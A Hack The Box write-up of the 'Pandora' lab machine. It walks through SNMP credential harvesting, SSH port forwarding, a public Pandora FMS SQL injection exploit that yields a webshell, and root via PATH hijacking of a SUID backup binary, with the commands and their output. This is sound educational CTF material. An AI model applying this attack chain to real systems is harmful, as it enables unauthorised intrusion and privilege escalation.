# HTB - Pandora

#### Ip: 10.10.11.136
#### Name: Pandora
#### Rating: Easy

----------------------------------------------------------------------

![Pandora.png](../assets/pandora_assets/Pandora.png)

### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I'll also use the `-sC` and `-sV` flags to use basic Nmap scripts and to enumerate versions too.

```
┌──(ryan㉿kali)-[~/HTB/Pandora]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.11.136
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-09 09:51 CST
Warning: 10.10.11.136 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.136
Host is up (0.077s latency).
Not shown: 65505 closed tcp ports (reset), 28 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
|_  256 e736433ba9478a190158b2bc89f65108 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
```

Checking out the site on port 80 we see a netowrk monitoring company called Play, and get a domain panda.htb. Lets add that to `/etc/hosts`. 

![pandora_play](../assets/pandora_assets/pandora_play.png)

Not finding much pf interest on port 80, I dedcided to scan for open UDP ports and found SNMP open:

```
┌──(ryan㉿kali)-[~/HTB/Pandora]
└─$ sudo nmap -sU --top-ports 25 10.10.11.136 | grep open

53/udp    open|filtered domain
161/udp   open          snmp
500/udp   open|filtered isakmp
1701/udp  open|filtered L2TP
```

We can fuzz for community strings with:
```
┌──(ryan㉿kali)-[~/HTB/Pandora]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.11.136 

Scanning 1 hosts, 3219 communities
10.10.11.136 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
10.10.11.136 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
```

And find the public string.

Lets further enumerate this:

![pandora_snmp.png](../assets/pandora_assets/pandora_snmp.png)

Nice, looks like we've got a username. Not sure what the 'Mississippi' is though..

Continuing to dig through the results, we find that daniel was a username, and find a record of his password too.

![pandora_daniel_creds.png](../assets/pandora_assets/pandora_daniel_creds.png)

From here we can SSH in as user daniel:

```
┌──(ryan㉿kali)-[~/HTB/Pandora]
└─$ ssh daniel@10.10.11.136                         
The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.136' (ED25519) to the list of known hosts.
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
...
daniel@pandora:~$ whoami
daniel
daniel@pandora:~$ hostname
pandora
```

Poking around the box we find the user.txt flag in matt's home directory, but can't access it:

```
daniel@pandora:/home/matt$ cat user.txt
cat: user.txt: Permission denied
```

Looking around the box, we see both the standard html directory in `/var/www` but also a directory called pandora, in which is another directory called pandora_console.

```
daniel@pandora:~$ cd /var/www
daniel@pandora:/var/www$ ls
html  pandora
daniel@pandora:/var/www$ cd pandora/
daniel@pandora:/var/www/pandora$ ls
index.html  pandora_console
```

This is interesting. Lets load LinPEAS to help us enumerate further:

We find two things immediatley of interest.

One is a a  file with the SUID bit set called pandora_backup that is owned by root, but can be executed by matt

![pandora_suid.png](../assets/pandora_assets/pandora_suid.png)

We'll have to revisit this if/when we gain access as user matt.

Even more interesting now though is the discovery of a vhost, that can only be accessed by localhost:

![pandora_network.png](../assets/pandora_assets/pandora_network.png)

![pandora_vhost.png](../assets/pandora_assets/pandora_vhost.png)


This is a great find. 

Lets set up the port forwarding needed to access the site:

```
┌──(ryan㉿kali)-[~/HTB/Pandora]
└─$ sudo ssh -L 80:127.0.0.1:80 daniel@10.10.11.136
```

We can now navigate to the internal site in our browser at http://127.0.0.1 

![pandora_internal.png](../assets/pandora_assets/pandora_internal.png)

We know from the LinPEAS findings that matt is likely the administrator for the site, but as of now we don't know his password.

Trying to login as user daniel we get the following error:

![pandora_error.png](../assets/pandora_assets/pandora_error.png)

Looking for unauthenticated exploits I find: https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated

Which exploits a SQL injection vulnerability in pandora FMS and impersonates the administrator, dropping us into a webshell.

Lets try it:

```
┌──(ryan㉿kali)-[~/HTB/Pandora]
└─$ python pandoraFMS_sqlpwn.py -t 127.0.0.1
URL:  http://127.0.0.1/pandora_console
[+] Sending Injection Payload
[+] Requesting Session
[+] Admin Session Cookie : aotbm9o5g4tt6snmjct7cc8ci0
[+] Sending Payload 
[+] Respose : 200
[+] Pwned :)
[+] If you want manual Control : http://127.0.0.1/pandora_console/images/pwn.php?test=
CMD > whoami
matt

CMD > hostname
pandora
```

Nice, that worked!

Next I'll set up a listener and grab a Python revers shell oneliner from revshells.com, so I can spawn a proper reverse shell:

![pandora_shello.png](../assets/pandora_assets/pandora_shello.png)

I can now grab that user.txt flag:

![pandora_user.png](../assets/pandora_assets/pandora_user.png)

### Privilege Escalation

Thinking back to my original LinPEAS scan, I recall that there was a file called pandora_backup, which was owned by root, that had the SUID bit set.

Trying to execute it we get this error:

```
matt@pandora:/home/matt$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
```

From the looks of this it appears to be utilizing tar, but may not be providing the absolute path.

Lets use ltrace to confirm:
```
matt@pandora:/tmp$ ltrace pandora_backup
getuid()                                         = 1000
geteuid()                                        = 1000
setreuid(1000, 1000)                             = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)                = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
)      = 43
system("tar -cvf /root/.backup/pandora-b"...$ 
```
Ok cool, `tar` is being invoked, but because its not using the abolute path `/usr/bin/tar` we can create our own malicious 'tar', update the `$PATH` and the program should execute our tar file with root permissions.

Lets try it:

```
matt@pandora:/tmp$ touch tar
matt@pandora:/tmp$ echo "/bin/sh" > tar
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ PATH=/tmp:$PATH
matt@pandora:/tmp$ pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
$ whoami
matt
```

I got stuck here for ages. This should be working to get me root, but everytime I ran it I just came back into a bash shell as ...matt... But why?

Looking around for answers I found 0xdf's writeup of the box, and he explains why in his "Beyond Root" section. Apparently there is an issue with Apache /mpm-itk and the inheritence of SUID privileges. Its an interesting read and I reccomend it, even if I don't totally understand it all: https://0xdf.gitlab.io/2022/05/21/htb-pandora.html#beyond-root

Anyways, the workaround here is getting SSH access as Matt, which allows us to exploit the pandora_backup as attempted before, but this time successfully.

To get SSH access first we'll need to generate some keys. I'll set this up on the target, and then transfer the id_rsa back over to my attacking machine:

```
matt@pandora:/home/matt$ mkdir .ssh
mkdir .ssh
matt@pandora:/home/matt$ cd .ssh
cd .ssh
matt@pandora:/home/matt/.ssh$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:n7wX2y8P3YQqSQ5MDSzpSTCFNYuY4x5e8tfDTymvamQ matt@pandora
The key's randomart image is:
+---[RSA 3072]----+
|    o=+o.        |
|   o.o+o.o       |
|  + .o.o. .      |
| . .  oo       . |
|  + .   S .   . .|
| o =  Eo * +.. o.|
|  o .o. = X .+. o|
|     ..  * oo o. |
|     .....+.   +o|
+----[SHA256]-----+
matt@pandora:/home/matt/.ssh$ ls
ls
id_rsa  id_rsa.pub
matt@pandora:/home/matt/.ssh$ touch authorized_keys
touch authorized_keys
matt@pandora:/home/matt/.ssh$ chmod 644 authorized_keys
chmod 644 authorized_keys
matt@pandora:/home/matt/.ssh$ cat id_rsa.pub >> authorized_keys
cat id_rsa.pub >> authorized_keys
matt@pandora:/home/matt/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
```

Once Matt's id_rsa is back on my box I can change modes and SSH in as matt:

```
┌──(ryan㉿kali)-[~/HTB/Pandora]
└─$ chmod 600 matt_id_rsa 
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Pandora]
└─$ ssh -i matt_id_rsa matt@10.10.11.136
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
```

Now, lets try that path hijacking again to get a root shell:

```
matt@pandora:/tmp$ touch tar
matt@pandora:/tmp$ echo "/bin/sh" > tar
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ PATH=/tmp:$PATH
matt@pandora:/tmp$ pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# id
uid=0(root) gid=1000(matt) groups=1000(matt)
# whoami
root
```

Nice, that worked this time!

Lets grab the final flag:

![pandora_root.png](../assets/pandora_assets/pandora_root.png)

Thanks for following along!

-Ryan

